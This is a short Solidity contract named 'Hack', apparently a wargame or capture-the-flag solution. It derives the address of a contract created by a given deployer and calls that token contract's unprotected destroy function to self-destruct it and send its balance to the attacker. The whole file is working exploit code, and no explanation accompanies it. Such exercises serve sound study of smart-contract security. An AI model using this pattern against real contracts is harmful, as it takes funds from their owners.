// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Hack {
    function recover(address sender) external pure returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01)));
        address addr = address(uint160(uint256(hash)));
        return addr;
    }

    function hack(ISimpleToken addr) external {
        addr.destroy(payable(address(this)));
    }
}

interface ISimpleToken {
    function destroy(address payable ) external;
}
